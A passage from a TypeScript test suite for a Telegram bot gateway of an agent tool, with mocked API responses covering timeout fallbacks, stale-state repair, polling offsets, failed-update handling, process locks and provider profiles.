      update_id: 1,
      message: {
        chat: { id: 123 },
        from: { id: 42, username: "fox" },
        text: "[MOCK_FINAL_TIMEOUT_AFTER_REVIEW_TOOL] 메모리 리뷰 대상 있어?"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });

    await waitForCondition(() => sent.some((message) => message.text.includes("[Fallback] LLM 최종 응답이 timeout")));
    expect(sent.at(-1)?.text).toContain("Memory pending:");
    const jobs = await new RunJobLedger(root).list({ includeTerminal: true });
    expect(jobs.some((job) => job.status === "failed" && job.failureKind === "timeout" && job.finalOutputSummary?.includes("[Fallback]"))).toBe(true);
  });

  it("repairs and resets stale Telegram gateway state without connector settings", async () => {
    const root = await initializedWorkspace();
    await saveTelegramGatewayState(root, {
      nextOffset: 20,
      chats: {
        "123": {
          providerId: "mock",
          activeSessionId: "session_missing",
          pendingCommand: {
            id: "pending_1",
            commandId: "pending.show",
            args: {},
            safety: "read_only",
            createdAt: new Date().toISOString(),
            expiresAt: new Date(Date.now() + 300000).toISOString(),
            createdAtMs: Date.now(),
            expiresAtMs: Date.now() + 300000,
            preview: "preview"
          }
        }
      },
      failureCount: 1,
      lastFailure: "open sessions/session_missing/session.json",
      updatedAt: new Date().toISOString()
    });

    expect((await inspectTelegramGatewayState(root)).staleSessions).toHaveLength(1);
    const repair = await repairTelegramGatewayState(root, { staleSessions: true });
    expect(repair).toMatchObject({
      repaired: true,
      staleSessionsCleared: 1,
      preservedNextOffset: 20
    });
    const repaired = await loadTelegramGatewayState(root);
    expect(repaired.chats["123"]?.activeSessionId).toBeUndefined();
    expect(repaired.chats["123"]?.pendingCommand).toBeUndefined();
    expect(repaired.failureCount).toBe(0);
    expect(repaired.lastFailure).toBeUndefined();

    const reset = await resetTelegramGatewayState(root);
    expect(reset).toMatchObject({
      removedChats: 1,
      preservedNextOffset: 20
    });
    const resetState = await loadTelegramGatewayState(root);
    expect(resetState.chats).toEqual({});
    expect(resetState.nextOffset).toBe(20);
  });

  it("runs Telegram long polling once, uses stored offset, and persists next offset", async () => {
    const root = await initializedWorkspace();
    const policyManager = new PolicyManager(root);
    const policy = await policyManager.loadPolicy();
    await writeRuntimeLocal(root, {
      connectors: {
        telegram: {
          ...policy.connectors.telegram,
          enabled: true,
          allowedChatIds: ["123"],
          defaultProvider: "mock"
        }
      }
    });
    await saveTelegramGatewayState(root, {
      nextOffset: 10,
      chats: {},
      failureCount: 0,
      updatedAt: new Date().toISOString()
    });
    const previousToken = process.env.TELEGRAM_BOT_TOKEN;
    process.env.TELEGRAM_BOT_TOKEN = "test-token";
    const requests: Array<{ url: string; body: Record<string, unknown> }> = [];
    const fetchImpl: FetchLike = async (url, init) => {
      const body = init?.body ? JSON.parse(String(init.body)) as Record<string, unknown> : {};
      requests.push({ url: String(url), body });
      if (String(url).endsWith("/getMe")) {
        return jsonResponse({ ok: true, result: { id: 1, username: "cosia_test_bot" } });
      }
      if (String(url).endsWith("/getUpdates")) {
        return jsonResponse({
          ok: true,
          result: [{
            update_id: 11,
            message: {
              chat: { id: 123 },
              from: { id: 42, username: "fox" },
              text: "/status"
            }
          }]
        });
      }
      if (String(url).endsWith("/sendMessage")) {
        return jsonResponse({ ok: true, result: { message_id: 1 } });
      }
      if (String(url).endsWith("/sendChatAction")) {
        return jsonResponse({ ok: true, result: true });
      }
      return jsonResponse({ ok: false, description: "unknown" }, 404);
    };
    try {
      await startTelegramGateway(root, {
        providerId: "mock",
        once: true,
        fetchImpl
      });
    } finally {
      if (previousToken === undefined) {
        delete process.env.TELEGRAM_BOT_TOKEN;
      } else {
        process.env.TELEGRAM_BOT_TOKEN = previousToken;
      }
    }

    const getUpdatesRequest = requests.find((request) => request.url.endsWith("/getUpdates"));
    expect(getUpdatesRequest?.body.offset).toBe(10);
    const chatActionRequest = requests.find((request) => request.url.endsWith("/sendChatAction"));
    expect(chatActionRequest?.body).toMatchObject({
      chat_id: "123",
      action: "typing"
    });
    const state = await loadTelegramGatewayState(root);
    expect(state.nextOffset).toBe(12);
    expect(state.chats["123"]).toBeDefined();
    expect(await pathExists(join(root, ".cosia-gateway", "telegram", "process.lock"))).toBe(false);
    expect(await pathExists(gatewayProcessLockPath(root))).toBe(false);
  });

  it("marks failing Telegram updates handled instead of retrying them forever", async () => {
    const root = await initializedWorkspace();
    const policyManager = new PolicyManager(root);
    const policy = await policyManager.loadPolicy();
    await writeRuntimeLocal(root, {
      connectors: {
        telegram: {
          ...policy.connectors.telegram,
          enabled: true,
          allowedChatIds: ["123"]
        }
      }
    });
    const session = await new SessionManager(root).createSession("cosia-agent", "Telegram provider failure");
    await saveTelegramGatewayState(root, {
      nextOffset: 20,
      chats: {
        "123": {
          providerId: "unknown-provider",
          activeSessionId: session.id,
          updatedAt: new Date().toISOString()
        }
      },
      failureCount: 0,
      updatedAt: new Date().toISOString()
    });
    const previousToken = process.env.TELEGRAM_BOT_TOKEN;
    process.env.TELEGRAM_BOT_TOKEN = "test-token";
    const sent: string[] = [];
    const fetchImpl: FetchLike = async (url, init) => {
      if (String(url).endsWith("/getMe")) {
        return jsonResponse({ ok: true, result: { id: 1, username: "cosia_test_bot" } });
      }
      if (String(url).endsWith("/getUpdates")) {
        return jsonResponse({
          ok: true,
          result: [{
            update_id: 21,
            message: {
              chat: { id: 123 },
              from: { id: 42, username: "fox" },
              text: "hello"
            }
          }]
        });
      }
      if (String(url).endsWith("/sendMessage")) {
        const body = init?.body ? JSON.parse(String(init.body)) as Record<string, unknown> : {};
        sent.push(String(body.text ?? ""));
        return jsonResponse({ ok: true, result: { message_id: 1 } });
      }
      if (String(url).endsWith("/sendChatAction")) {
        return jsonResponse({ ok: true, result: true });
      }
      return jsonResponse({ ok: false, description: "unknown" }, 404);
    };
    try {
      await startTelegramGateway(root, {
        providerId: "unknown-provider",
        once: true,
        fetchImpl
      });
    } finally {
      if (previousToken === undefined) {
        delete process.env.TELEGRAM_BOT_TOKEN;
      } else {
        process.env.TELEGRAM_BOT_TOKEN = previousToken;
      }
    }

    await waitForCondition(() => sent.join("\n").includes("will not retry forever"));
    const state = await loadTelegramGatewayState(root);
    expect(state.nextOffset).toBe(22);
    const jobs = await new RunJobLedger(root).list({ includeTerminal: true });
    expect(jobs.some((job) => job.status === "failed" && job.errorSummary?.includes("Unknown model provider"))).toBe(true);
    expect(sent.join("\n")).toContain("will not retry forever");
  });

  it("runs the top-level gateway supervisor once and manages stop/unlock state", async () => {
    const root = await initializedWorkspace();
    const policyManager = new PolicyManager(root);
    const policy = await policyManager.loadPolicy();
    await writeRuntimeLocal(root, {
      connectors: {
        telegram: {
          ...policy.connectors.telegram,
          enabled: true,
          allowedChatIds: ["123"],
          allowedUserIds: ["42"],
          defaultProvider: "mock"
        }
      }
    });
    await writeGatewayStopRequest(root, "user_stop");
    const previousToken = process.env.TELEGRAM_BOT_TOKEN;
    process.env.TELEGRAM_BOT_TOKEN = "test-token";
    const requests: string[] = [];
    const fetchImpl: FetchLike = async (url) => {
      requests.push(String(url));
      if (String(url).endsWith("/getMe")) {
        return jsonResponse({ ok: true, result: { id: 1, username: "cosia_test_bot" } });
      }
      if (String(url).endsWith("/getUpdates")) {
        return jsonResponse({ ok: true, result: [] });
      }
      return jsonResponse({ ok: true, result: { message_id: 1 } });
    };
    try {
      await startGateway(root, {
        connector: "telegram",
        modelProvider: "mock",
        once: true,
        fetchImpl
      });
    } finally {
      if (previousToken === undefined) {
        delete process.env.TELEGRAM_BOT_TOKEN;
      } else {
        process.env.TELEGRAM_BOT_TOKEN = previousToken;
      }
    }

    expect(requests.some((url) => url.endsWith("/getUpdates"))).toBe(true);
    expect(await pathExists(gatewayStopRequestPath(root))).toBe(false);
    expect(await pathExists(gatewayProcessLockPath(root))).toBe(false);
    const status = JSON.parse(await formatGatewayStatus(root, { json: true })) as {
      supervisor: { running: boolean; processLock: boolean };
      connectors: { telegram: { enabled: boolean } };
    };
    expect(status.supervisor.running).toBe(false);
    expect(status.supervisor.processLock).toBe(false);
    expect(status.connectors.telegram.enabled).toBe(true);

    const restartPreviousToken = process.env.TELEGRAM_BOT_TOKEN;
    process.env.TELEGRAM_BOT_TOKEN = "test-token";
    try {
      await restartGateway(root, {
        connector: "telegram",
        modelProvider: "mock",
        once: true,
        fetchImpl
      });
    } finally {
      if (restartPreviousToken === undefined) {
        delete process.env.TELEGRAM_BOT_TOKEN;
      } else {
        process.env.TELEGRAM_BOT_TOKEN = restartPreviousToken;
      }
    }
    expect(await pathExists(gatewayProcessLockPath(root))).toBe(false);

    expect(await stopGateway(root)).toMatchObject({
      alreadyStopped: true,
      stopped: true
    });

    await writeFile(gatewayProcessLockPath(root), `${JSON.stringify({
      lockId: "stale-lock",
      kind: "process",
      owner: "test",
      pid: -1,
      workspacePath: root,
      gatewayId: "gateway",
      command: "cosia gateway start",
      createdAt: "2026-01-01T00:00:00.000Z",
      startedAt: "2026-01-01T00:00:00.000Z",
      heartbeatAt: "2026-01-01T00:00:00.000Z",
      createdAtMs: 1,
      startedAtMs: 1,
      heartbeatAtMs: 1
    })}\n`, "utf8");
    expect(await stopGateway(root)).toMatchObject({
      staleLock: true,
      staleLockRemoved: true,
      requested: false,
      stopped: true,
      alreadyStopped: true
    });
    expect(await pathExists(gatewayStopRequestPath(root))).toBe(false);
    expect(await pathExists(gatewayProcessLockPath(root))).toBe(false);
    expect(await unlockStaleGateway(root, { staleOnly: true })).toMatchObject({
      removed: false,
      reason: "no process lock"
    });
  });

  it("starts the gateway with the active provider profile and private Telegram token", async () => {
    const root = await initializedWorkspace();
    await addProviderProfile(root, "gateway-profile", {
      providerId: "openrouter",
      apiKey: "gateway-profile-key",
      model: "openai/gpt-test"
    });
    await useProviderProfile(root, "gateway-profile");
    await enableTelegramConnector(root, true);
    await addTelegramChatId(root, "123");
    await addTelegramUserId(root, "42");
    await setTelegramToken(root, "test-token");
    const requests: string[] = [];
    const fetchImpl: FetchLike = async (url) => {
      requests.push(String(url));
      if (String(url).endsWith("/getMe")) {
        return jsonResponse({ ok: true, result: { id: 1, username: "cosia_test_bot" } });
      }
      if (String(url).endsWith("/getUpdates")) {
        return jsonResponse({
          ok: true,
          result: [{
            update_id: 1,
            message: {
              chat: { id: 123 },
              from: { id: 42, username: "fox" },
              text: "/status"
            }
          }]
        });
      }
      return jsonResponse({ ok: true, result: { message_id: 1 } });
    };

    await startGateway(root, {
      connector: "telegram",
      once: true,
      fetchImpl
    });

    expect(requests.some((url) => url.includes("bottest-token/getUpdates"))).toBe(true);
    const state = await loadTelegramGatewayState(root);
    expect(state.chats["123"]?.providerId).toBe("gateway-profile");
  });

  it("releases session locks when async work rejects", async () => {
    const root = await initializedWorkspace();
    await expect(withSessionLock(root, "session_lock_test", {
      owner: "test"
    }, async () => {
      throw new Error("boom");
    })).rejects.toThrow("boom");
    expect(await pathExists(sessionLockPath(root, "session_lock_test"))).toBe(false);
  });
});
